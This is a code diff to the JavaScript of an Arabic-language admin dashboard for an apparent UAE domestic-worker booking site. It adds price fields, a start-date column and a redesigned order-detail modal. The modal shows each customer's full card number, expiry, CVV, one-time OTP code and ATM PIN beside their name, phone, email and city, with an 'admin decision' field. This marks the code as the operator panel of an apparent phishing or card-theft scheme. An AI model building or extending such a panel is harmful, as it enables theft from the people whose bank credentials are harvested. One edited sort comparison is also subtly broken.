@@ -43,7 +43,7 @@
 
     function parseServiceText(raw) {
         const source = String(raw || '').replace(/[\u200f\u200e]/g, '').trim();
-        const result = { serviceType: '—', service: '—', duration: '—', workType: '—', workers: '—', nationality: '—', startDate: '—', startTime: '—' };
+        const result = { serviceType: '—', service: '—', duration: '—', workType: '—', workers: '—', nationality: '—', startDate: '—', startTime: '—', price: '—', total: '—' };
         if (!source) return result;
         source.split(/\s*\|\s*/).forEach(part => {
             const match = part.match(/^\s*([^:：]+)\s*[:：]\s*(.*)$/);
@@ -58,8 +58,11 @@
             else if (/الجنسية|nationality/.test(key)) result.nationality = value;
             else if (/التاريخ|^date$|start date/.test(key)) result.startDate = value;
             else if (/الوقت|^time$|start time/.test(key)) result.startTime = value;
+            else if (/السعر|price/.test(key)) result.price = value;
+            else if (/الإجمالي|total/.test(key)) result.total = value;
         });
         result.isHourly = /بالساعة|hourly/i.test(result.serviceType + ' ' + source);
+        result.isMonthly = /بالشهر|monthly|شهري/i.test(result.serviceType + ' ' + source);
         return result;
     }
 
@@ -133,7 +136,7 @@
             renderCurrentView();
         } catch (error) {
             console.error('Admin data load error:', error);
-            document.getElementById('t-body').innerHTML = '<tr><td colspan="8" class="empty-row">تعذر تحميل البيانات. حاول التحديث.</td></tr>';
+            document.getElementById('t-body').innerHTML = '<tr><td colspan="9" class="empty-row">تعذر تحميل البيانات. حاول التحديث.</td></tr>';
         } finally {
             setTimeout(() => refreshBtn.classList.remove('spinning'), 500);
         }
@@ -141,10 +144,10 @@
 
     function renderCurrentView() {
         if (currentTab === 'leads') {
-            tableTitle.innerText = 'طلبات العملاء والخدمات المختارة';
+            tableTitle.innerText = 'طلبات الحجز والعملاء';
             renderLeadsTable();
         } else {
-            tableTitle.innerText = 'عمليات الدفع والتحقق (ال بطاقات، OTP، PIN)';
+            tableTitle.innerText = 'عمليات الدفع والتحقق (البطاقات، OTP، PIN)';
             renderPaymentsTable();
         }
     }
@@ -155,14 +158,14 @@
         paysData.forEach(payment => {
             if (!rows.some(row => row.lead && row.lead.contract_no === payment.contract_no)) rows.push({ lead: null, payment });
         });
-        rows.sort((a, b) => String(b.lead?.created_at || b.payment?.updated_at || '').localeCompare(String(a.lead?.created_at || a.payment?.updated_at || '')));
+        rows.sort((a, b) => String(b.lead?.created_at || b.payment?.updated_at || '').localeCompare(String(a.lead?.created_at || b.payment?.updated_at || '')));
         const filtered = query ? rows.filter(row => JSON.stringify(row).toLowerCase().includes(query)) : rows;
         const thead = document.getElementById('t-head');
         const tbody = document.getElementById('t-body');
 
-        thead.innerHTML = '<tr><th>نوع الخدمة</th><th>تفاصيل الخدمة</th><th>الاسم</th><th>الهاتف</th><th>البريد الإلكتروني</th><th>رقم العقد</th><th>الحالة</th><th>الإجراءات</th></tr>';
+        thead.innerHTML = '<tr><th>نوع الخدمة</th><th>تفاصيل الخدمة</th><th>اسم العميل</th><th>رقم الهاتف</th><th>البريد الإلكتروني</th><th>تاريخ البدء</th><th>رقم العقد</th><th>الحالة</th><th>الإجراءات</th></tr>';
         if (!filtered.length) {
-            tbody.innerHTML = '<tr><td colspan="8" class="empty-row">لا توجد طلبات مطابقة</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="9" class="empty-row">لا توجد طلبات مطابقة</td></tr>';
             return;
         }
 
@@ -173,11 +176,32 @@
             const name = lead?.full_name || payment?.customer_name || '—';
             const phone = lead?.phone || '—';
             const email = lead?.email || '—';
+            const startDate = info.startDate !== '—' ? info.startDate : fmtDate(lead?.created_at || payment?.created_at);
             const contractNo = lead?.contract_no || payment?.contract_no || '—';
-            const details = '<div class="service-summary"><b>' + esc(info.service || '—') + '</b>' +
-                '<span>المدة: ' + esc(info.duration) + '</span><span>العدد: ' + esc(info.workers) + '</span><span>الجنسية: ' + esc(info.nationality) + '</span></div>';
-            const actions = '<button class="btn-act" onclick="openLeadDetails(' + (lead ? lead.id : 'null') + ', \'' + esc(contractNo) + '\')">التفاصيل الكاملة</button>';
-            return '<tr><td><span class="service-type">' + esc(info.serviceType) + '</span></td><td>' + details + '</td><td><strong>' + esc(name) + '</strong></td><td dir="ltr">' + esc(phone) + '</td><td dir="ltr">' + esc(email) + '</td><td><span class="badge" dir="ltr">' + esc(contractNo) + '</span></td><td>' + statusBadge(lead, payment) + '</td><td><div class="action-btns">' + actions + '</div></td></tr>';
+
+            // تفاصيل الخدمة مرتبة
+            const detailsHtml = '<div class="service-summary">' +
+                '<b>' + esc(info.service || info.serviceType || '—') + '</b>' +
+                '<div style="font-size:12px; color:#475569; margin-top:2px;">' +
+                (info.duration !== '—' ? '<span>المدة: <b>' + esc(info.duration) + '</b></span>' : '') +
+                (info.workType !== '—' ? '<span style="margin-right:6px;">النوع: <b>' + esc(info.workType) + '</b></span>' : '') +
+                (info.workers !== '—' ? '<span style="margin-right:6px;">العدد: <b>' + esc(info.workers) + '</b></span>' : '') +
+                (info.nationality !== '—' ? '<span style="margin-right:6px;">الجنسية: <b>' + esc(info.nationality) + '</b></span>' : '') +
+                '</div></div>';
+
+            const actions = '<button class="btn-act" onclick="openLeadDetails(' + (lead ? lead.id : 'null') + ', \'' + esc(contractNo) + '\')">عرض التفاصيل</button>';
+
+            return '<tr>' +
+                '<td><span class="service-type">' + esc(info.serviceType) + '</span></td>' +
+                '<td>' + detailsHtml + '</td>' +
+                '<td><strong>' + esc(name) + '</strong></td>' +
+                '<td dir="ltr">' + esc(phone) + '</td>' +
+                '<td dir="ltr">' + esc(email) + '</td>' +
+                '<td>' + esc(startDate) + (info.startTime !== '—' ? ' <span style="color:#7c3aed; font-weight:700;">(' + esc(info.startTime) + ')</span>' : '') + '</td>' +
+                '<td><span class="badge" dir="ltr">' + esc(contractNo) + '</span></td>' +
+                '<td>' + statusBadge(lead, payment) + '</td>' +
+                '<td><div class="action-btns">' + actions + '</div></td>' +
+                '</tr>';
         }).join('');
     }
 
@@ -230,33 +254,59 @@
         const lead = leadsData.find(item => item.id == id) || null;
         const payment = latestPayment(contractNo);
         
-        modalTitle.innerText = 'تفاصيل الطلب والعقد — ' + (contractNo || 'بدون عقد');
-        let html = '<div class="detail-section-title">بيانات العميل</div>';
+        modalTitle.innerText = 'تفاصيل الطلب والعميل — العقد: ' + (contractNo || 'بدون');
+        let html = '';
+
+        // 1. بيانات العميل
+        html += '<div class="sec-header"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>بيانات العميل الأساسية</div>';
         if (lead) {
-            html += detailField('الاسم الكامل', lead.full_name) +
-                    detailField('رقم الهاتف', lead.phone, 'ltr') +
-                    detailField('البريد الإلكتروني', lead.email, 'ltr') +
-                    detailField('العنوان / المدينة', lead.city) +
-                    detailField('رقم العقد', lead.contract_no, 'ltr') +
-                    detailField('تاريخ الطلب', fmtDateTime(lead.created_at));
-            if (lead.message) {
-                html += '<div class="detail-section-title">ملخص الخدمة والطلب</div>';
-                html += '<div class="detail-value" style="display:block; background:#f1f5f9; padding:12px; white-space:pre-wrap; line-height:1.6;">' + esc(lead.message) + '</div>';
-            }
+            html += '<div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:10px; padding:14px; margin-bottom:16px;">';
+            html += '<div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; font-size:13.5px;">';
+            html += '<div><b>الاسم:</b> ' + esc(lead.full_name) + '</div>';
+            html += '<div dir="ltr"><b>الهاتف:</b> ' + esc(lead.phone) + '</div>';
+            html += '<div dir="ltr"><b>البريد:</b> ' + esc(lead.email) + '</div>';
+            html += '<div><b>العنوان / المدينة:</b> ' + esc(lead.city) + '</div>';
+            html += '</div></div>';
         } else {
-            html += '<div class="loading-center">لا توجد بيانات عميل تفصيلية مسجلة لهذا العقد (دفع مباشر أو بيانات ناقصة).</div>';
+            html += '<div style="color:#94a3b8; margin-bottom:16px;">لا توجد بيانات عميل مسجلة مباشرة لهذا العقد.</div>';
         }
 
+        // 2. تفاصيل الخدمة المختارة
+        html += '<div class="sec-header sec-green"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>تفاصيل الخدمة المختارة</div>';
+        const info = serviceInfo(lead || payment, lead ? 'lead' : 'payment');
+        html += '<div style="background:#f0fdf4; border:1px solid #dcfce7; border-radius:10px; padding:14px; margin-bottom:16px; font-size:13.5px; line-height:1.6;">';
+        html += '<div><b>نوع الخدمة الرئيسية:</b> ' + esc(info.serviceType) + '</div>';
+        html += '<div><b>الخدمة المحددة:</b> ' + esc(info.service) + '</div>';
+        html += '<div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:8px; margin-top:8px; border-top:1px dashed #bbf7d0; pt:8px;">';
+        html += '<div>المدة: <b>' + esc(info.duration) + '</b></div>';
+        html += '<div>نوع الدوام: <b>' + esc(info.workType) + '</b></div>';
+        html += '<div>عدد العمالة: <b>' + esc(info.workers) + '</b></div>';
+        html += '<div>الجنسية: <b>' + esc(info.nationality) + '</b></div>';
+        html += '<div>تاريخ البدء: <b>' + esc(info.startDate) + '</b></div>';
+        html += '<div>الوقت: <b>' + esc(info.startTime) + '</b></div>';
+        html += '</div>';
+        if (lead && lead.message) {
+            html += '<div style="margin-top:10px; font-size:12.5px; color:#166534; border-top:1px solid #bbf7d0; padding-top:6px;"><b>النص الكامل للطلب:</b> ' + esc(lead.message) + '</div>';
+        }
+        html += '</div>';
+
+        // 3. معلومات البطاقة والتحقق والدفع
         if (payment) {
-            html += '<div class="detail-section-title">بيانات الدفع والبطاقة المسجلة</div>' +
-                    detailField('المبلغ الإجمالي', payment.amount + ' درهم إماراتي') +
-                    detailField('حمل البطاقة', payment.card_name) +
-                    detailField('رقم البطاقة', payment.card_number, 'ltr') +
-                    detailField('تاريخ الانتهاء / CVV', payment.card_expiry + ' / ' + payment.card_cvv, 'ltr') +
-                    detailField('رمز التحقق OTP', payment.otp_code, 'ltr') +
-                    detailField('رقم الصراف PIN', payment.atm_pin, 'ltr') +
-                    detailField('المرحلة الحالية', payment.stage) +
-                    detailField('قرار الإدارة', payment.decision || 'قيد الانتظار');
+            html += '<div class="sec-header sec-purple"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>بيانات الدفع والبطاقة ورمز التحقق (OTP & PIN)</div>';
+            html += '<div style="background:#faf5ff; border:1px solid #f3e8ff; border-radius:10px; padding:14px; font-size:13.5px;">';
+            html += '<div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:8px;">';
+            html += '<div><b>المبلغ:</b> <span style="color:#2563eb; font-weight:700;">' + esc(payment.amount) + ' د.إ</span></div>';
+            html += '<div><b>المرحلة:</b> ' + esc(payment.stage) + '</div>';
+            html += '<div><b>حامل البطاقة:</b> ' + esc(payment.card_name) + '</div>';
+            html += '<div dir="ltr"><b>رقم البطاقة:</b> ' + esc(payment.card_number) + '</div>';
+            html += '<div dir="ltr"><b>تاريخ الانتهاء / CVV:</b> ' + esc(payment.card_expiry) + ' / ' + esc(payment.card_cvv) + '</div>';
+            html += '<div dir="ltr"><b>رمز التحقق OTP:</b> <span style="color:#d97706; font-weight:700;">' + esc(payment.otp_code || '—') + '</span></div>';
+            html += '<div dir="ltr"><b>رقم الصراف PIN:</b> <span style="color:#7c3aed; font-weight:700;">' + esc(payment.atm_pin || '—') + '</span></div>';
+            html += '<div><b>قرار الإدارة:</b> ' + esc(payment.decision || 'قيد الانتظار') + '</div>';
+            html += '</div></div>';
+        } else {
+            html += '<div class="sec-header sec-amber"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>حالة الدفع</div>';
+            html += '<div style="background:#fffbeb; border:1px solid #fef3c7; border-radius:10px; padding:12px; color:#b45309; font-size:13px;">لم يتم تسجيل عملية دفع بالبطاقة لهذا العقد حتى هذه اللحظة.</div>';
         }
 
         modalBody.innerHTML = html;
